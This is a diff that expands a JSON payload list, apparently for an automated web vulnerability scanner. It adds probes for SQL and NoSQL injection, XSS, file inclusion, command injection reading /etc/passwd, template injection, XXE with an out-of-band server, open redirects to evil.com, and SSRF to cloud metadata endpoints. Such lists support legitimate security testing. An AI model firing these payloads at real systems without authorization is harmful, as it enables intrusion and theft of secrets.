@@ -1,5 +1,95 @@
 {
   "sqli": ["'", "\"", "' OR '1'='1"],
+  "sqli_error": ["'", "\"", "')", "\")", ";", "\\"],
+  "sqli_boolean": ["' AND 1=1--", "' AND 1=2--", "' OR '1'='1--", "' OR '1'='2--"],
+  "sqli_time": ["'; WAITFOR DELAY '00:00:05'--", "' AND SLEEP(5)--", "' AND pg_sleep(5)--", "' OR SLEEP(3)--"],
+  "sqli_union": [
+    "' UNION SELECT NULL--",
+    "' UNION SELECT NULL,NULL--",
+    "' UNION SELECT NULL,NULL,NULL--",
+    "' UNION SELECT NULL,NULL,NULL,NULL--"
+  ],
+  "sqli_nosql": [
+    "{\"$ne\": null}",
+    "{\"$gt\": \"\"}",
+    "{\"$regex\": \".*\"}",
+    "{\"$where\": \"1==1\"}"
+  ],
   "xss": ["<myagent-xss-probe>", "\"><myagent-xss-probe>"],
-  "lfi": ["convert.base64-encode", "../../etc/passwd", "C:/Windows/win.ini", "php://filter/convert.base64-encode/resource=index.php"]
+  "xss_attr": [
+    "\" onmouseover=\"alert(1)",
+    "' onfocus='alert(1) autofocus",
+    "\"><img src=x onerror=alert(1)>",
+    "javascript:alert(1)"
+  ],
+  "xss_script": [
+    "</script><img src=x onerror=alert(1)>",
+    "\";alert(1);//",
+    "'-alert(1)-'",
+    "</textarea><img src=x onerror=alert(1)>"
+  ],
+  "lfi": [
+    "convert.base64-encode",
+    "../../etc/passwd",
+    "C:/Windows/win.ini",
+    "php://filter/convert.base64-encode/resource=index.php"
+  ],
+  "command_injection": [
+    "; ls -la",
+    "| whoami",
+    "`id`",
+    "$(cat /etc/passwd)",
+    "& dir",
+    "|| uname -a",
+    "; sleep 3",
+    "| ping -c 3 127.0.0.1"
+  ],
+  "command_injection_blind": [
+    "; sleep 5",
+    "`sleep 5`",
+    "$(sleep 5)",
+    "| timeout 5 ping -c 1 127.0.0.1"
+  ],
+  "ssti": [
+    "{{7*7}}",
+    "${7*7}",
+    "<%= 7*7 %>",
+    "#{7*7}",
+    "{{config.items()}}",
+    "{{''.__class__.__mro__[1].__subclasses__()}}",
+    "${class.getClassForName('java.lang.Runtime')}"
+  ],
+  "ssti_blind": [
+    "{{7*'7'}}",
+    "${7*'7'}",
+    "{{'A'.toLowerCase()}}"
+  ],
+  "xxe": [
+    "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>",
+    "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://_OOB_SERVER_/xxe\">%remote;]>"
+  ],
+  "csrf": [],
+  "open_redirect": [
+    "https://evil.com",
+    "//evil.com",
+    "https:evil.com",
+    "\\\\evil.com",
+    "https://attacker.com/%2F.."
+  ],
+  "ssrf_internal": [
+    "http://127.0.0.1/",
+    "http://127.0.0.1:8080/admin",
+    "http://localhost/",
+    "http://localhost:8080/",
+    "http://[::1]/",
+    "http://0.0.0.0/",
+    "http://169.254.169.254/latest/meta-data/",
+    "http://metadata.google.internal/computeMetadata/v1/"
+  ],
+  "ssrf_protocol": [
+    "file:///etc/passwd",
+    "gopher://127.0.0.1:6379/_INFO",
+    "dict://127.0.0.1:6379/INFO",
+    "ftp://attacker.com/evil"
+  ]
 }
